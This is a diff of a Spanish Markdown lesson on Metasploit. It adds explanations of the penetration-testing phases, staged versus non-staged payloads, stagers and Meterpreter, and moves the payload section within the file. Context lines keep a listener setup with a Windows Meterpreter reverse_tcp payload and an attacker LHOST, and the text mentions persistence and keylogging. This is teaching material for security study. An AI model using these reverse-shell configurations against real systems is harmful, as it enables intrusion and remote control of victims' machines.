@@ -8,6 +8,25 @@ En términos prácticos, Metasploit se utiliza para probar la seguridad de un si
 
 En esta clase, veremos cómo utilizar algunas de las funcionalidades de esta herramienta.
 
+```python 
+❯ /usr/share/metasploit-framework/                       # MSF File System Structure
+❯ /usr/share/metasploit-framework/modules                # MSF Module Locations
+	❯ ~/.ms4/modules
+```
+
+## Penetration Testing con MSF
+
+| Penetration Testing Phase| Metasploit Framework Implementation |
+|----|----|
+| Information Gathering & Enumeration  | Módulos auxiliares |
+| Vulnerability Scanning | Módulos auxiliares con Nessus |
+| Explotation | Módulos de exploit & Payloads |
+| Post Explotation | Meterpreter |
+| Privilege Escalation | Módulos de Post explotación / Meterpreter |
+| Maintaining Persistent Access | Módulos de post explotación / Persistencia |
+
+
+
 ## Terminología 
 
 * Interface: Método de interactuar con Metasploit **(Msfconsole, Metasploit Framework CLI, Metasploit Community Edition)**
@@ -26,6 +45,29 @@ En esta clase, veremos cómo utilizar algunas de las funcionalidades de esta her
 * NOPS: Usado para asegurar que los tamaños de los payloads son consistentes y asegurar la estabilidad de un payload cuando es ejecutado. 
 * Auxiliar: Un modulo que es usado para ejecutar funciones adicionales como un escaneo de puertos o enumeración. 
 
+## Tipos de Payload en MSF
+
+Los dos tipos de payloads utilizados en ataques informáticos: **Staged** y **Non-Staged**.
+
+-   **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
+-   **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
+
+Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.
+
+Tipos de Payloads
+```bash
+Non-Stage               # Sends exploit shellcode all at once. Larger in size ando won't always work -> windows/meterpreter_reverse_tcp
+Staged                  # Sends payload in stages. Can be less stable -> windows/meterpreter/reverse_tcp
+```
+
+## Stagers vs Stage 
+
+* Stagers: Son típicamente usados para establecer una comunicación con el canal estable  de atacante a victima, después un stage payload es descargado y ejecutado de el sistema victima. 
+* Stage: Componentes de un payload que son descargados por un Stager. 
+
+## Meterpreter 
+
+Es un multi-funcional payload que es ejecutado en memoria en un sistema victima haciéndolo difícil de detectar. El se comunica a través de un socket stager y provee a un atacante un interpretado de comandos interactivo de un sistema victima que facilite la ejecución de comandos del sistema, navegación del sistema de archivos,  keylogging y mucho mas. 
 
 ## Consola Metasploit
 
@@ -148,19 +190,5 @@ Configuración del 'Listener' para las sesiones de persistencia
 ❯ set payload windows/meterpreter/reverse_tcp            # Configuramos un payload dedicado a Windows 
 ❯ set LHOST <IP Atacante>                                # Configuramos nuestra IP
 ❯ run
-```
-
-
-Los dos tipos de payloads utilizados en ataques informáticos: **Staged** y **Non-Staged**.
-
--   **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
--   **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
-
-Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.
-
-Tipos de Payloads
-```bash
-Non-Stage               # Sends exploit shellcode all at once. Larger in size ando won't always work -> windows/meterpreter_reverse_tcp
-Staged                  # Sends payload in stages. Can be less stable -> windows/meterpreter/reverse_tcp
 ```
 
